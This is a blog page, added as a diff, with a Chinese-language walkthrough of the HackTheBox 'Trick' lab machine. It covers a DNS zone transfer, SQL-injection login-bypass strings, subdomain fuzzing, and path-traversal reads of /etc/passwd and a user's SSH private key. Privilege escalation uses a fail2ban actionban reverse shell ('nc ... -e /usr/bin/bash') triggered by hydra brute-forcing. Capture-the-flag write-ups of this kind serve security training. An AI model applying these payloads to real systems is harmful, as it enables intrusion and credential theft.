@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Enumeration  Nmap Scan 扫描到的开放端口如下 1234567891011121322&#x2F;tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: |   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)|">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Support Trick Challenge">
+<meta property="og:url" content="http://example.com/2022/08/13/htb-trick/index.html">
+<meta property="og:site_name" content="a0dy&#39;s Home">
+<meta property="og:description" content="Enumeration  Nmap Scan 扫描到的开放端口如下 1234567891011121322&#x2F;tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: |   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)|">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-08-13T04:00:00.000Z">
+<meta property="article:modified_time" content="2023-03-19T09:40:34.666Z">
+<meta property="article:author" content="Andy">
+<meta property="article:tag" content="SQL Injection">
+<meta property="article:tag" content="LFI">
+<meta property="article:tag" content="DNS AXFR">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HTB Support Trick Challenge</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/08/18/htb-shared/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/08/08/htb-support/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/08/13/htb-trick/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/08/13/htb-trick/&text=HTB Support Trick Challenge"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/08/13/htb-trick/&title=HTB Support Trick Challenge"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/08/13/htb-trick/&is_video=false&description=HTB Support Trick Challenge"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Support Trick Challenge&body=Check out this article: http://example.com/2022/08/13/htb-trick/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/08/13/htb-trick/&title=HTB Support Trick Challenge"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/08/13/htb-trick/&title=HTB Support Trick Challenge"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/08/13/htb-trick/&title=HTB Support Trick Challenge"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/08/13/htb-trick/&title=HTB Support Trick Challenge"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/08/13/htb-trick/&name=HTB Support Trick Challenge&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/08/13/htb-trick/&t=HTB Support Trick Challenge"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#enumeration"><span class="toc-number">1.</span> <span class="toc-text"> Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap-scan"><span class="toc-number">1.1.</span> <span class="toc-text"> Nmap Scan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zone-transfer-attack"><span class="toc-number">1.2.</span> <span class="toc-text"> Zone Transfer Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql-injection"><span class="toc-number">1.3.</span> <span class="toc-text"> SQL Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#subdomain-traversal"><span class="toc-number">1.4.</span> <span class="toc-text"> Subdomain Traversal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96ssh%E5%87%AD%E6%8D%AE-private-key"><span class="toc-number">1.5.</span> <span class="toc-text"> 获取ssh凭据 private key</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#elevated-privilege"><span class="toc-number">1.6.</span> <span class="toc-text"> Elevated Privilege</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        HTB Support Trick Challenge
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Andy</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-08-13T04:00:00.000Z" itemprop="datePublished">2022-08-13</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Machine/">Machine</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/DNS-AXFR/" rel="tag">DNS AXFR</a>, <a class="tag-link-link" href="/tags/LFI/" rel="tag">LFI</a>, <a class="tag-link-link" href="/tags/SQL-Injection/" rel="tag">SQL Injection</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="enumeration"><a class="markdownIt-Anchor" href="#enumeration"></a> Enumeration</h2>
+<h3 id="nmap-scan"><a class="markdownIt-Anchor" href="#nmap-scan"></a> Nmap Scan</h3>
+<p>扫描到的开放端口如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)</span><br><span class="line">|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)</span><br><span class="line">|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)</span><br><span class="line">25/tcp open  smtp    Postfix smtpd</span><br><span class="line">|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING</span><br><span class="line">53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian</span><br><span class="line">80/tcp open  http    nginx 1.14.2</span><br><span class="line">|_http-title: Coming Soon - Start Bootstrap Theme</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br></pre></td></tr></table></figure>
+<h3 id="zone-transfer-attack"><a class="markdownIt-Anchor" href="#zone-transfer-attack"></a> Zone Transfer Attack</h3>
+<p>由于开放了53端口的Bind ISC服务，可以尝试<code>dns axfr</code>攻击，简单来说就是跨DNS服务器区域传输时，能够方便地将信息复制到其他服务器上。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig axfr @10.10.11.16</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>DiG:全程Domain information Groper，主要用于DNS查询，是BIND软件套件中的工具，取代了旧工具nslookup和hosts</p>
+</blockquote>
+<p>Attack Format</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dig axfr @&lt;DNS_IP&gt; <span class="comment">#Try zone transfer without domain</span></span><br><span class="line">dig axfr @&lt;DNS_IP&gt; &lt;DOMAIN&gt; <span class="comment">#Try zone transfer guessing the domain</span></span><br><span class="line">fierce --domain &lt;DOMAIN&gt; --dns-servers &lt;DNS_IP&gt; <span class="comment">#Will try toperform a zone transfer against every authoritative name server and if this doesn&#x27;twork, will launch a dictionary attack</span></span><br></pre></td></tr></table></figure>
+<p>事实证明目标机器确实没有进行有效的axfr保护，我们可以得到axfr配置下的相关记录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800</span><br><span class="line">trick.htb.              604800  IN      NS      trick.htb.</span><br><span class="line">trick.htb.              604800  IN      A       127.0.0.1</span><br><span class="line">trick.htb.              604800  IN      AAAA    ::1</span><br><span class="line">preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.</span><br><span class="line">trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800</span><br></pre></td></tr></table></figure>
+<h3 id="sql-injection"><a class="markdownIt-Anchor" href="#sql-injection"></a> SQL Injection</h3>
+<p>至此<code>/etc/hosts</code>文件已经添加了<code>trick.htb</code>和<code>preprod-payroll.trick.htb</code>，接下来访问<code>preprod-payroll.trick.htb</code>这个域名，来到了一个后台登录页面。首先尝试常见地默认登录凭证，试了几个常用的我发现进不去，然后尝试SQL注入过身份验证，以下是常见方法：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&lt;</span>username<span class="operator">&gt;</span><span class="string">&#x27; OR 1=1--</span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">OR</span> <span class="string">&#x27;&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;	Allows authentication without a valid username.</span></span><br><span class="line"><span class="string">&lt;username&gt;&#x27;</span><span class="comment">--</span></span><br><span class="line"><span class="string">&#x27; union select 1, &#x27;</span><span class="operator">&lt;</span><span class="keyword">user</span><span class="operator">-</span>fieldname<span class="operator">&gt;</span><span class="string">&#x27;, &#x27;</span><span class="operator">&lt;</span>pass<span class="operator">-</span>fieldname<span class="operator">&gt;</span><span class="string">&#x27; 1--</span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<p>账号密码都输入<code>' or '1'='1</code>或者账号输入<code>1' or 1=1 -- -</code>,这样进入后台后我们就成功以administrator的身份进入了后台，我猜测应该是后台只有administrator这一个账户才能进入到后台，所以系统错误识别我们为后台管理员。<br />
+跳转后的URL为<code>http://preprod-payroll.trick.htb/index.php?page=home</code>，很容易让人联想到Remote File Inclusion，但是尝试了几个常见的对应措施后没有办法正确显示文件。</p>
+<h3 id="subdomain-traversal"><a class="markdownIt-Anchor" href="#subdomain-traversal"></a> Subdomain Traversal</h3>
+<p>观察当前URL为<code>preprod-payroll.trick.htb</code>，猜测可能有与<code>preprod-xxxx.trick.htb</code>相关的域名</p>
+<p>使用sed命令统一格式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed <span class="string">&#x27;s/^/preprod-/&#x27;</span> &#123;your dictionary path&#125;</span><br></pre></td></tr></table></figure>
+<p>wfuzz遍历子域</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -t 200 --hl 83 -H <span class="string">&quot;Host: FUZZ.trick.htb&quot;</span> -u trick.htb</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">********************************************************</span><br><span class="line">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://10.10.11.166/</span><br><span class="line">Total requests: 20000</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line">ID           Response   Lines    Word       Chars       Payload                            </span><br><span class="line">=====================================================================</span><br><span class="line"></span><br><span class="line">000000254:   200        178 L    631 W      9660 Ch     &quot;preprod-marketing&quot;                </span><br><span class="line">000005320:   302        266 L    527 W      9546 Ch     &quot;preprod-payroll&quot;                  </span><br><span class="line"></span><br><span class="line">Total time: 0</span><br><span class="line">Processed Requests: 20000</span><br><span class="line">Filtered Requests: 19998</span><br><span class="line">Requests/sec.: 0</span><br></pre></td></tr></table></figure>
+<p>添加<code>preprod-marketing.trick.htb</code>记录，然后访问门户网站，我们发现URL此时也可能存在本地文件包含漏洞，再次尝试发现访问<code>http://preprod-marketing.trick.htb/index.php?page=....//....//....//etc/passwd</code>可以正常显示passwd的敏感内容</p>
+<h3 id="获取ssh凭据-private-key"><a class="markdownIt-Anchor" href="#获取ssh凭据-private-key"></a> 获取ssh凭据 private key</h3>
+<p>访问 <a target="_blank" rel="noopener" href="http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa">http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa</a> 可以得到ssh凭据，将其另存为id_rsa</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh michael@trick.htb -i id_rsa</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>值得注意的是要能够正常使用到id_rsa这张凭据，必须将其权限更为仅自己有读写权限</p>
+</blockquote>
+<p>拿到user flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/michael/user.txt</span><br></pre></td></tr></table></figure>
+<h3 id="elevated-privilege"><a class="markdownIt-Anchor" href="#elevated-privilege"></a> Elevated Privilege</h3>
+<p>先看看这个账户有什么软件有特殊管理员权限，先常规操作<code>sudo -l</code>，输出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for michael on trick:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User michael may run the following commands on trick:</span><br><span class="line">    (root) NOPASSWD: /etc/init.d/fail2ban restart</span><br></pre></td></tr></table></figure>
+<p>我们可以在<a target="_blank" rel="noopener" href="https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7">这篇文章</a>获得提权方法：</p>
+<p>比较重要的一个文件就是<code>iptables-multiport.conf</code>，修改该文件，利用该文件获得reverse shell,修改里面的actionban变量：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actionban: /usr/bin/nc &#123;your IP&#125; &#123;your listen port&#125; -e /usr/bin/bash</span><br></pre></td></tr></table></figure>
+<p>这个时候重启服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /etc/init.d/fail2ban restart</span><br></pre></td></tr></table></figure>
+<p>首先<code>nc</code>本地监听自定义端口，错误登录ssh尝试运行自定义命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://trick.htb</span><br></pre></td></tr></table></figure>
+<p>然后监听Terminal运行<code>cat /root/root.txt</code>拿到root.txt</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#enumeration"><span class="toc-number">1.</span> <span class="toc-text"> Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap-scan"><span class="toc-number">1.1.</span> <span class="toc-text"> Nmap Scan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zone-transfer-attack"><span class="toc-number">1.2.</span> <span class="toc-text"> Zone Transfer Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql-injection"><span class="toc-number">1.3.</span> <span class="toc-text"> SQL Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#subdomain-traversal"><span class="toc-number">1.4.</span> <span class="toc-text"> Subdomain Traversal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96ssh%E5%87%AD%E6%8D%AE-private-key"><span class="toc-number">1.5.</span> <span class="toc-text"> 获取ssh凭据 private key</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#elevated-privilege"><span class="toc-number">1.6.</span> <span class="toc-text"> Elevated Privilege</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/08/13/htb-trick/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/08/13/htb-trick/&text=HTB Support Trick Challenge"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/08/13/htb-trick/&title=HTB Support Trick Challenge"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/08/13/htb-trick/&is_video=false&description=HTB Support Trick Challenge"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Support Trick Challenge&body=Check out this article: http://example.com/2022/08/13/htb-trick/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/08/13/htb-trick/&title=HTB Support Trick Challenge"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/08/13/htb-trick/&title=HTB Support Trick Challenge"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/08/13/htb-trick/&title=HTB Support Trick Challenge"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/08/13/htb-trick/&title=HTB Support Trick Challenge"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/08/13/htb-trick/&name=HTB Support Trick Challenge&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/08/13/htb-trick/&t=HTB Support Trick Challenge"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    Andy
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
